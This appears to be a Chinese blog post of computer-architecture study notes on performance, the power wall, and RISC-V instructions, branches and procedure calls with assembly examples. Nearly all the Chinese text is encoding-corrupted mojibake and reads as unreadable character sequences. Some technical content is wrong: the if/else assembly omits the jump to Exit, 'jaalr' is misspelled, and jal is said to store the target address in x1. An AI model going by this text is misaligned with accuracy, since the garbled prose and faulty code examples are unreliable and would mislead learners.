åŠå…¶åç»­æ¼”è¿›ï¼›</p><p>ç°ä»£è®¡ç®—æœºæ¶æ„ä¸­çš„å…«ä¸ªä¼Ÿå¤§æ€æƒ³ï¼›</p></blockquote><h3 id="1-2-å…«ä¸ªä¼Ÿå¤§çš„è®¡ç®—æœºæ€æƒ³"><a href="#1-2-å…«ä¸ªä¼Ÿå¤§çš„è®¡ç®—æœºæ€æƒ³" class="headerlink" title="1.2 å…«ä¸ªä¼Ÿå¤§çš„è®¡ç®—æœºæ€æƒ³"></a>1.2 å…«ä¸ªä¼Ÿå¤§çš„è®¡ç®—æœºæ€æƒ³</h3><ul><li>æ‘©å°”å®šå¾‹çš„å‘æ˜</li><li>æŠ½è±¡åŒ–æ–¹æ³•</li><li>åŠ é€Ÿå¸¸ç”¨äº‹åŠ¡</li><li>å¹¶è¡Œè®¡ç®—</li><li>æµæ°´çº¿æœºåˆ¶</li><li>é¢„æµ‹æœºåˆ¶</li><li>å†…å­˜çš„é‡‘å­—å¡”ç»“æ„</li><li>åˆ©ç”¨å†—ä½™æé«˜å¯é æ€§</li></ul><p>ä¸¤ç§ åº•å±‚è½¯ä»¶ï¼š æ“ä½œç³»ç»Ÿ å’Œ ç¼–è¯‘å™¨</p><h3 id="1-6-è®¡ç®—æœºçš„è¡¨ç°"><a href="#1-6-è®¡ç®—æœºçš„è¡¨ç°" class="headerlink" title="1.6 è®¡ç®—æœºçš„è¡¨ç°"></a>1.6 è®¡ç®—æœºçš„è¡¨ç°</h3><p>å®šä¹‰æ—¶é—´</p><p>è¿è¡Œæ—¶é—´åˆ†ä¸º ï¼š ç»è¿‡æ—¶é—´ ï¼Œ ç›¸åº”æ—¶é—´ ï¼Œ è¿è¡Œæ—¶é—´</p><p>CPU æ‰§è¡Œæ—¶é—´åˆ†ä¸º ï¼š å•çº¯æ‰§è¡Œç¨‹åºçš„æ—¶é—´ ï¼Œ ä¸ºäº†æ‰§è¡Œç¨‹åº è€Œ è°ƒç”¨ æ“ä½œç³»ç»Ÿçš„æ—¶é—´</p><ul><li>æ—¶é’Ÿå‘¨æœŸæ•°=æŒ‡ä»¤ä¸ªæ•°$$\times$$æŒ‡ä»¤å¹³å‡æ—¶é’Ÿä¸ªæ•°</li><li>clock cycles per instrunction,ç®€ç§° <code>CPI</code>  ä¸ºæ‰€æœ‰æŒ‡ä»¤æ‰§è¡Œçš„æ—¶é’Ÿä¸ªæ•°çš„å¹³å‡</li></ul><p>CPU æ‰§è¡Œæ—¶é—´ = æŒ‡ä»¤æ•° * CPI * æ—¶é’Ÿæ—¶é—´</p><p>è¯„åˆ¤æ ‡å‡†</p><p>è¦ä¾æ®ä¸åŒæƒ…å†µè€Œåˆ¤æ–­ï¼Œå¦‚ä¸€äº›æœåŠ¡å™¨å¯¹IOå¾ˆä¾èµ–ï¼Œéœ€è¦è½¯ç¡¬ä»¶ç»¼åˆæ€§èƒ½ï¼Œ</p><p>è€Œä¸€äº›åº”ç”¨åˆ™å¯èƒ½åªå…³æ³¨ ååé‡ æˆ–è€…ååº”æ—¶é—´ï¼Œæˆ–è€…ä¸¤è€…çš„ç»„åˆã€‚</p><p>æ‰€ä»¥ä¸ºæé«˜è¡¨ç°ï¼Œä½ å¿…é¡»è¦çŸ¥é“å“ªäº›æ–¹é¢å½±å“ç€ä»–ï¼Œä»è€Œæ–¹ä¾¿æ‰¾åˆ°ç“¶é¢ˆ</p><p>æé«˜æ ‡å‡†</p><p>å‡å°‘åº”ç”¨ç¨‹åºçš„æ—¶é’Ÿä¸ªæ•°æˆ–è€…æé«˜æ—¶é’Ÿé¢‘ç‡</p><h3 id="1-7-åŠŸè€—å¢™"><a href="#1-7-åŠŸè€—å¢™" class="headerlink" title="1.7 åŠŸè€—å¢™"></a>1.7 åŠŸè€—å¢™</h3><p>é¦–å…ˆä»‹ç»äº†8ä»£Intel CPUçš„é¢‘ç‡å’ŒåŠŸè€—èµ°åŠ¿å›¾ï¼›éœ€è¦æ³¨æ„çš„æ˜¯åœ¨Pentium4ï¼ˆ2001ï¼‰æ—¶ï¼Œé¢‘ç‡è¾¾åˆ°3.6GHz,åŠŸè€—è¾¾åˆ°103Mï¼Œèµ·åé¢‘ç‡ä¸åŠŸè€—éƒ½æœ‰é™ä½ï¼›</p><p>å…¶æ¬¡ä»‹ç»å•ä¸ªæ™¶ä½“ç®¡çš„åŠ¨æ€åŠŸè€—(ç„¦è€³å’Œç“¦ç‰¹è§’åº¦ï¼‰ï¼š<br> Energy<img src="https://math.jianshu.com/math?formula=%5Cpropto" alt="\propto">1/2<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times">Capacitive load<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> Voltages2<br> Power<img src="https://math.jianshu.com/math?formula=%5Cpropto" alt="\propto">1/2<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times">Capacitive load<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> Voltages2 <img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times">Frequency switched</p><p>Frequency switchedå’Œæ—¶é’Ÿé¢‘ç‡ç›¸å…³ï¼›<br> with regard to the Figure, how could clock rates grow by a factor of 1000 while power increased by only a factor of 30?(é¢‘ç‡æœ‰1000å€å¢é•¿è€ŒåŠŸè€—åªæœ‰30å€å¢é•¿)<br> Energy and thus power can be reduced by lowering the voltageï¼Œæ¯ä»£CPUéƒ½é‡‡ç”¨è¿™ç§æŠ€æœ¯ï¼Œå³æ¯ä»£ç”µå‹å‡å°‘15%ï¼ˆ0.0225ï¼‰</p><p>In 20 years, voltages have gone from 5V to 1V, which is why the increase in power is only 30 times.(0.0225x1000=22.5<img src="https://math.jianshu.com/math?formula=%5Capprox" alt="\approx">30)</p><p>ç°ä»£çš„é—®é¢˜æ˜¯ï¼Œç»§ç»­é™ä½ç”µå‹ä¼šä½¿æ™¶ä½“ç®¡too leakyï¼ˆæœåŠ¡å™¨èŠ¯ç‰‡40%åŠŸè€—æ¥æºäºleakageï¼‰</p><p>to try to adress the power problem, designers have already attached large devices to increase cooling. and they turn off parts of the chip that are not used in a given clock cycle.<br> å°½ç®¡éœ€è¦é«˜æ˜‚çš„é™æ¸©è®¾å¤‡ï¼ˆ300WåŠŸè€—ï¼‰ï¼Œè¿™ç§æ–¹æ¡ˆè¿˜æ˜¯åº”ç”¨äºPCå’Œserverï¼Œè€ŒPMDåˆ™ä¸éœ€è¦ï¼›</p><p>Power  is  a challenge for integrated circuits for 2 reasons:</p><ol><li>power must be brought in and distributed around the chip;ç°ä»£èŠ¯ç‰‡å¯èƒ½éœ€è¦æ•°ç™¾ä¸ªgroundå’Œpowerçš„å¼•è„š</li><li>power is dissipated as heat and must be removed.(åŠŸè€—æ¶ˆè€—ä¸ºçƒ­é‡éœ€è¦æ›´è´µçš„æ•£çƒ­è®¾å¤‡)</li></ol><blockquote><p>ä¸ºäº†è§£å†³èƒ½è€—é—®é¢˜ï¼Œå¼•å…¥å¤šå¤„ç†å™¨æ¦‚å¿µï¼Œè¦æ±‚æˆ‘ä»¬è¦é‡æ–°ç¼–å†™ç¨‹åºä»¥é€‚åº”ã€‚</p></blockquote><h2 id="Chapter2-è®¡ç®—æœº-â€œè¯­è¨€â€-ä»‹ç»"><a href="#Chapter2-è®¡ç®—æœº-â€œè¯­è¨€â€-ä»‹ç»" class="headerlink" title="Chapter2 è®¡ç®—æœº â€œè¯­è¨€â€ ä»‹ç»"></a>Chapter2 è®¡ç®—æœº â€œè¯­è¨€â€ ä»‹ç»</h2><h3 id="2-2-ç¡¬ä»¶ç¼–ç¨‹è¯­è¨€"><a href="#2-2-ç¡¬ä»¶ç¼–ç¨‹è¯­è¨€" class="headerlink" title="2.2 ç¡¬ä»¶ç¼–ç¨‹è¯­è¨€"></a>2.2 ç¡¬ä»¶ç¼–ç¨‹è¯­è¨€</h3><p><code>add a,b,c</code>  å°†å˜é‡<code>b</code>ï¼Œ<code>c</code>ç›¸åŠ åæ”¾å…¥<code>a</code>ä¸­</p><p>æ¯ä¸ª RISC-V æŒ‡ä»¤ åªæ‰§è¡Œä¸€ä¸ªæ“ä½œï¼Œæœ€å¤šå…è®¸ä¸‰ä¸ªå˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ä¾‹1 a &#x3D; b+c+d+e</span><br><span class="line">add a,b,c</span><br><span class="line">add a,a,d</span><br><span class="line">add a,a,e</span><br></pre></td></tr></table></figure><blockquote><p>è®¾è®¡ç†å¿µ1 ï¼šç®€å•æœ‰åˆ©äºè§„æ•´åŒ–</p></blockquote><h3 id="2-3-æ“ä½œæ•°"><a href="#2-3-æ“ä½œæ•°" class="headerlink" title="2.3 æ“ä½œæ•°"></a>2.3 æ“ä½œæ•°</h3><p>RISCVä¸­ï¼Œç®—æœ¯è¿ç®—æŒ‡ä»¤çš„æ“ä½œæ•°åªèƒ½æ¥è‡ªäºå¯„å­˜å™¨ï¼Œæ¯ä¸ªå¯„å­˜å™¨å¤§å°ä¸º64bitsï¼Œåªæœ‰32ä¸ª</p><blockquote><p>è®¾è®¡ç†å¿µ2ï¼šç®€æ´å°±æ˜¯é€Ÿåº¦</p></blockquote><p>ç†è§£ï¼šå½“å¯„å­˜å™¨å˜å¤šï¼Œç¡¬ä»¶å¯»å€æ—¶é—´ä¼šéšä¹‹å˜é•¿ï¼Œä»è€Œé™ä½æ€§èƒ½ï¼›</p><p>å¯„å­˜å™¨è¡¨ç¤ºæ–¹æ³• = X + æ•°å­—</p><p>å¯„å­˜å™¨çš„å®¹é‡æ˜¯æœ‰é™çš„ï¼Œå½“éœ€è¦å¤§çš„æ•°æ®ç»“æ„æ—¶ï¼Œå°±éœ€è¦å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå†…å­˜ç›¸æ¯”äºå¯„å­˜å™¨è¦å¤§çš„å¤šï¼Œä½†æ˜¯è®¿é—®é€Ÿåº¦ä¹Ÿæœ‰æ•°é‡çº§çš„å·®è·ã€‚</p><p>ä½†ç®—æœ¯æŒ‡ä»¤åªèƒ½æ“ä½œå¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå°†å†…å­˜ä¸­çš„æ•°æ®è¯»å…¥å¯„å­˜å™¨ï¼Œè¿›è¡Œæ“ä½œåï¼Œå†å­˜å›å†…å­˜ä¸­ï¼Œå…¶ä¸­ å†…å­˜-ã€‹å¯„å­˜å™¨ ç§°ä¸º loadï¼Œå¯„å­˜å™¨-ã€‹å†…å­˜ ç§°ä¸º store</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#ä¾‹å­2 ï¼š g&#x3D;h+A[8] Aä¸ºå¤§64ä½æ•°æ® ç¼–è¯‘å™¨åˆ†é… g-X20 h-X21 Açš„åŸºå€å­˜åœ¨X22</span><br><span class="line"></span><br><span class="line">ld x9, 8(x22) &#x2F;&#x2F; ä¸´æ—¶å¯„å­˜å™¨ x9 å¾—åˆ° A[8]</span><br><span class="line">add x20,x21,x9 &#x2F;&#x2F; g &#x3D; h + A[8]</span><br></pre></td></tr></table></figure><p><code>8(x22)</code> ä¸ºä¸€ç§å†…å­˜è¡¨ç¤ºæ³•ï¼Œ8æ˜¯åç§»é‡ï¼Œx22 å­˜å‚¨äº†Aæ•°ç»„çš„åŸºå€</p><p>ç°åœ¨å¤§éƒ¨åˆ†ç»“æ„ä»ç„¶é‡‡ç”¨ å­—èŠ‚ å¯»å€çš„æ–¹å¼ï¼ŒRISC-Vä¹Ÿä¸ä¾‹å¤–ï¼›æ‰€ä»¥å¯„å­˜å™¨å’Œå†…å­˜éƒ½è¡¨ç¤ºä¸º0x8ï¼Œ0x10ï¼Œ0x18 ç­‰</p><p>åœ¨ 64bit ä¸­ byte çš„æ’åºé—®é¢˜ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š å¤§ç«¯-ä»å¤§åˆ°å°ï¼Œå°ç«¯-ä»å°åˆ°å¤§</p><p>RISC-V é‡‡ç”¨å°ç«¯å¯»å€çš„æ–¹å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#ä¾‹å­3 A[12]&#x3D;h+A[8]</span><br><span class="line">ld  x9,64(x22)</span><br><span class="line">add x9,x21,x9</span><br><span class="line">sd  x9,96(x22)</span><br></pre></td></tr></table></figure><p>è¿™ç§å¹³å‡¡çš„è®¿é—®å†…å­˜çš„è¡Œä¸ºç§°ä¸º å¯„å­˜å™¨æº¢å‡º</p><h4 id="å¸¸é‡-å’Œ-ç«‹å³æ•°"><a href="#å¸¸é‡-å’Œ-ç«‹å³æ•°" class="headerlink" title="å¸¸é‡ å’Œ ç«‹å³æ•°"></a>å¸¸é‡ å’Œ ç«‹å³æ•°</h4><p>RISC-V å°†è¿‘ä¸€åŠçš„æŒ‡ä»¤éœ€è¦æ“ä½œ ç«‹å³æ•° æˆ– å¸¸é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ä¾‹4 ï¼š x22+4</span><br><span class="line">ld  x9,AddConstant 4(x3) &#x2F;&#x2F; x9 &#x3D; constant 4</span><br><span class="line">add x22,x22,x9</span><br></pre></td></tr></table></figure><p>ç¨‹åºç¼–è¯‘åä¼šå°†å¸¸é‡4 å†™å…¥å†…å­˜ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ä¾‹5ï¼šç«‹å³æ•°æŒ‡ä»¤</span><br><span class="line">addi x22,x22,4 &#x2F;&#x2F;x22&#x3D;x22+4</span><br></pre></td></tr></table></figure><p>æ³¨æ„: å¯¹äºå¸¸ç”¨çš„å¸¸é‡0 ï¼Œ RISC-V å°† <code>0</code> å›ºå®šæ”¾å…¥ <code>x0</code> ä¸­</p><h3 id="2-5-æŒ‡ä»¤è¡¨ç¤º"><a href="#2-5-æŒ‡ä»¤è¡¨ç¤º" class="headerlink" title="2.5 æŒ‡ä»¤è¡¨ç¤º"></a>2.5 æŒ‡ä»¤è¡¨ç¤º</h3><p><img src="https://upload-images.jianshu.io/upload_images/18610675-d358b3032c45c963.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/750/format/webp" alt="æŒ‡ä»¤è¡¨ç¤º"></p><h3 id="2-6-é€»è¾‘æŒ‡ä»¤"><a href="#2-6-é€»è¾‘æŒ‡ä»¤" class="headerlink" title="2.6 é€»è¾‘æŒ‡ä»¤"></a>2.6 é€»è¾‘æŒ‡ä»¤</h3><p><code>å·¦ç§»</code> <code>å³ç§»</code> <code>AND</code> <code>OR</code> <code>XOR</code> <code>NOT</code> ç­‰</p><h3 id="2-7-åˆ†æ”¯æŒ‡ä»¤"><a href="#2-7-åˆ†æ”¯æŒ‡ä»¤" class="headerlink" title="2.7 åˆ†æ”¯æŒ‡ä»¤"></a>2.7 åˆ†æ”¯æŒ‡ä»¤</h3><p>ä¸¤ä¸ªä¸»è¦æŒ‡ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; å¦‚æœç›¸ç­‰åˆ™ç»§ç»­</span><br><span class="line">beq rs1,rs2,L1</span><br><span class="line">&#x2F;&#x2F; å¦‚æœä¸ç­‰åˆ™ç»§ç»­</span><br><span class="line">bne rs1,rs2,L1</span><br></pre></td></tr></table></figure><h4 id="ä¾‹6"><a href="#ä¾‹6" class="headerlink" title="ä¾‹6"></a>ä¾‹6</h4><p>å¦‚ä½•å°†ä»¥ä¸‹cè¯­è¨€ç¼–è¯‘ä¸ºRISC-Væ ¼å¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// c è¯­è¨€</span></span><br><span class="line"><span class="keyword">if</span>(i==j) f=g+h; </span><br><span class="line"><span class="keyword">else</span> f = g-h;</span><br></pre></td></tr></table></figure><table><thead><tr><th>f</th><th>g</th><th>h</th><th>i</th><th>j</th></tr></thead><tbody><tr><td>x19</td><td>x20</td><td>x21</td><td>x22</td><td>x23</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; RISC - V </span><br><span class="line">bne x22,x23,Else</span><br><span class="line">add x19,x20,x21</span><br><span class="line">Else: sub x19,x20,x21</span><br><span class="line">Exit:</span><br></pre></td></tr></table></figure><h4 id="ä¾‹7-loops"><a href="#ä¾‹7-loops" class="headerlink" title="ä¾‹7 - loops"></a>ä¾‹7 - loops</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(save[i]==k) i+=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>i</th><th>k</th><th>æ•°ç»„åŸºå€</th></tr></thead><tbody><tr><td>x22</td><td>x24</td><td>x25</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Loop: slli x10,x22,3 # x10 &#x3D; i*8 å·¦ç§»ä¸‰ä½</span><br><span class="line">add x10,x10,x25 # x10 &#x3D; save[i]çš„åœ°å€</span><br><span class="line">ld  x9,0(x10) # x9 &#x3D; save[i]çš„å€¼</span><br><span class="line">bne x9,x24 Exit #å¦‚æœ save[i]ï¼&#x3D;k é€€å‡º</span><br><span class="line">addi x22,x22,1 # i&#x3D;i+1</span><br><span class="line">beq x0,x0,Loop #å›åˆ°å¼€å§‹</span><br><span class="line">Exit:</span><br></pre></td></tr></table></figure><p><strong>åè¯è§£é‡Šï¼š</strong>  åŸºæœ¬å—ï¼ˆ basic blockï¼‰</p><p>åŸºæœ¬å—å°±æ˜¯ä¸€ç³»åˆ—é™¤äº†ç»“å°¾å°±æ²¡æœ‰åˆ†æ”¯ï¼Œé™¤äº†å¼€å§‹å§ä»¬ä¸ºåˆ†æ”¯æ ‡ç­¾çš„è¯­å¥ï¼Œé€šä¿—æ¥è¯´ï¼Œåªè¦åŸºæœ¬å—ä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤è¢«æ‰§è¡Œäº†ï¼Œé‚£ä¹ˆåŸºæœ¬å—å†…æ‰€æœ‰æ‰§è¡Œéƒ½ä¼šæŒ‰ç…§<strong>é¡ºåº</strong>ä»…<strong>æ‰§è¡Œä¸€æ¬¡</strong> ã€‚ç¼–è¯‘çš„ç¬¬ä¸€æ­¥å°±æ˜¯å°†ç¨‹åºåˆ†æˆåŸºæœ¬å—</p><h4 id="å…¶ä»–åˆ†æ”¯è¯­å¥"><a href="#å…¶ä»–åˆ†æ”¯è¯­å¥" class="headerlink" title="å…¶ä»–åˆ†æ”¯è¯­å¥"></a>å…¶ä»–åˆ†æ”¯è¯­å¥</h4><p><code>blt</code>   å’Œ  <code>bge</code>   å°†å¯„å­˜å™¨çš„å€¼å½“åš    è¡¥ç     è¿›è¡Œæ¯”è¾ƒ</p><p><code>bltu</code> å’Œ <code>bgeu</code> å°†å¯„å­˜å™¨çš„å€¼å½“ä½œæ— ç¬¦å·æ•°è¿›è¡Œæ¯”è¾ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># if x20&gt;&#x3D;x11 or if x20 negative</span><br><span class="line">bgeu x20,x11,IndexOutOfBounds</span><br></pre></td></tr></table></figure><h3 id="2-8-è®¡ç®—æœºç¡¬ä»¶å¯¹è¿‡ç¨‹çš„æ”¯æŒ"><a href="#2-8-è®¡ç®—æœºç¡¬ä»¶å¯¹è¿‡ç¨‹çš„æ”¯æŒ" class="headerlink" title="2.8 è®¡ç®—æœºç¡¬ä»¶å¯¹è¿‡ç¨‹çš„æ”¯æŒ"></a>2.8 è®¡ç®—æœºç¡¬ä»¶å¯¹è¿‡ç¨‹çš„æ”¯æŒ</h3><p><strong>è¿‡ç¨‹</strong>æˆ–è€…<strong>å‡½æ•°</strong>æ˜¯ç”¨æ¥ç»“æ„åŒ–ç¨‹åºçš„å·¥å…·ï¼Œä½¿ç”¨è¿‡ç¨‹èƒ½å¤Ÿè®©ç¨‹åºå˜å¾—æ˜“è¯»ä¸”å¢å¼ºä»£ç çš„é‡ç”¨æ€§ï¼Œç¨‹åºå‘˜åªéœ€è¦å…³æ³¨ä»»åŠ¡çš„ä¸€éƒ¨åˆ†ã€‚å‚æ•°å¯ä»¥ç”¨æ¥ä¼ é€’å’Œè¿”å›å€¼ï¼Œå¯ä»¥ç”¨ä½œè¿‡ç¨‹å’Œå…¶ä»–ç¨‹åºçš„æ¥å£ã€‚æˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿‡ç¨‹å°±åƒä¸€ä¸ªæ‰§è¡Œç§˜å¯†ä»»åŠ¡çš„é—´è°ï¼Œè·å–æ‰€éœ€èµ„æºã€æ‰§è¡Œä»»åŠ¡ã€æ©ç›–è¡Œè¸ªï¼Œæœ€åå¸¦ç€ç»“æœå›åˆ°åŸå¤„ã€‚ä»»åŠ¡å®Œæˆåå°±ä¸å†å¹²æ¶‰å…¶ä»–ä»»åŠ¡ã€‚åŒæ ·æˆ‘ä»¬å¯ä»¥å°†è¿‡ç¨‹çš„æ‰§è¡Œåˆ†ä¸ºå…­æ­¥ :</p><ol><li> å°†å‚æ•°æ”¾åœ¨è¿‡ç¨‹èƒ½è®¿é—®çš„åœ°æ–¹</li><li> å°†æ§åˆ¶äº¤ç»™è¿‡ç¨‹</li><li> è·å–éœ€è¦çš„å­˜å‚¨èµ„æºç»™è¿‡ç¨‹</li><li> å®Œæˆé¢„å®šçš„ä»»åŠ¡</li><li> å°†ç»“æœæ”¾åˆ°è°ƒç”¨ç¨‹åºèƒ½è®¿é—®çš„åœ°æ–¹</li><li> å°†æ§åˆ¶äº¤å›æºç‚¹</li></ol><p>ç”±äºå¯„å­˜å™¨æ˜¯åœ¨è®¡ç®—æœºä¸­æœ€å¿«çš„å­˜å‚¨å™¨ï¼Œç¨‹åºåº”å°½å¯èƒ½ä½¿ç”¨å¯„å­˜å™¨ã€‚RISC-Væä¾›äº†ä¸€äº›å¯„å­˜å™¨æ¥ç»™è°ƒç”¨è¿‡ç¨‹æ—¶ä½¿ç”¨ :</p><ul><li><code>x10</code>-<code>x17</code> : å­˜å‚¨éœ€è¦ä¼ é€’çš„å‚æ•° å’Œ è¿”å›å€¼</li><li><code>x1</code> : å­˜å‚¨è¿‡ç¨‹è°ƒç”¨æºç‚¹çš„åœ°å€</li></ul><p>é™¤äº†åˆ†é…äº†è¿™äº›å¯„å­˜å™¨ï¼ŒRISC-Væä¾›äº†ä¸€æ¡è·³è½¬é“¾æ¥æŒ‡ä»¤jalã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal ProcedureAddress</span><br></pre></td></tr></table></figure><p>jal ï¼š è·³è½¬ å¹¶ è¿æ¥ ç¨‹åºç»“æ„ï¼Œä¸»è¦å®Œæˆ</p><ul><li>è·³è½¬åˆ°<code>ProcedureAddress</code>ç»§ç»­æ‰§è¡Œ</li><li>å°†<code>ProcedureAddress</code> ä¿å­˜åˆ° <code>x1</code> å¯„å­˜å™¨</li></ul><p>è¢«æ‰§è¡Œçš„è¿‡ç¨‹å–åˆ°x1åœ°å€ï¼Œå¹¶ç»§ç»­æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jalr x0,0(x1)</span><br></pre></td></tr></table></figure><p>æˆ– ç›´æ¥è¿›è¡Œæ— æ¡ä»¶è·³è½¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal x0,Label</span><br></pre></td></tr></table></figure><hr><p>å¦‚æœä¸€ä¸ªè¿‡ç¨‹éœ€è¦ç”¨åˆ°å¤šä¸ªå¯„å­˜å™¨ï¼Œä½¿ç”¨å®Œæˆåè¿˜éœ€è¦æ¢å¤ï¼Œå­˜å‚¨å¤šä¸ªå€¼æ˜¯ï¼Œå°±éœ€è¦ä½¿ç”¨<strong>å †æ ˆ</strong></p><p>ä¾‹å¦‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="title">leaf_example</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> g,<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> h,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> i,<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> f;</span><br><span class="line">    f=(g+h)-(i+j);</span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¿»è¯‘ä¸ºæ±‡ç¼–è¯­è¨€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">leaf_example:</span><br><span class="line">addi sp,sp,-24</span><br><span class="line">sd x5,16(sp)</span><br><span class="line">sd x6,8(sp)</span><br><span class="line">sd x20,0(sp)</span><br><span class="line"></span><br><span class="line">add x5,x10,x11</span><br><span class="line">add x6,x12,x13</span><br><span class="line">sub x20,x5,x6</span><br><span class="line">addi x10,x20,0</span><br><span class="line"></span><br><span class="line">ld x20,0(sp)</span><br><span class="line">ld x6,8(sp)</span><br><span class="line">ld x5,16(sp)</span><br><span class="line">addi sp,sp,24</span><br><span class="line">jaalr x0,0(x1)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­  <strong>g/h/i/jå¯¹åº”x10/x11/x12/x13ï¼Œfå¯¹åº”x20</strong></p><h4 id="å¯„å­˜å™¨åˆ†ç±»"><a href="#å¯„å­˜å™¨åˆ†ç±»" class="headerlink" title="å¯„å­˜å™¨åˆ†ç±»"></a>å¯„å­˜å™¨åˆ†ç±»</h4><p>RISC-V å°† 19 ä¸ªä¸´æ—¶å¯„å­˜å™¨åˆ†ä¸ºä¸¤ç±»</p><ul><li>x5-x7 and x28-x31 ï¼š åœ¨è¿‡ç¨‹è°ƒç”¨æ—¶ä¸ä¼šè¢«è°ƒç”¨æ–¹ä¿å­˜çš„</li><li>x8-x9 and x18-x27 ï¼š åœ¨è¿‡ç¨‹è°ƒç”¨æ—¶ä¸€å®šä¼šè¢«ä¿å­˜çš„</li></ul><p>æ‰€ä»¥  line3/4/13/14 storeå’Œload çš„æ“ä½œå¯ä»¥çœå»</p><h4 id="åµŒå¥—ç¨‹åº"><a href="#åµŒå¥—ç¨‹åº" class="headerlink" title="åµŒå¥—ç¨‹åº"></a>åµŒå¥—ç¨‹åº</h4><p>å¦‚æœç¨‹åº è°ƒç”¨å…¶ä»–çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯ å¦‚æœè°ƒç”¨è‡ªå·±ï¼Œå½¢æˆé€’å½’è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±è¦ç‰¹æ®Šæ³¨æ„äº†</p><p><strong>ä¾‹å­ ï¼š é€’å½’</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="title">fact</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(n&lt;<span class="number">1</span>) </span><br><span class="line">      <span class="keyword">return</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">      <span class="keyword">return</span> (n*fact(n<span class="number">-1</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//parameter nå­˜åœ¨x10ä¸­</span></span><br></pre></td></tr></table></figure><figure 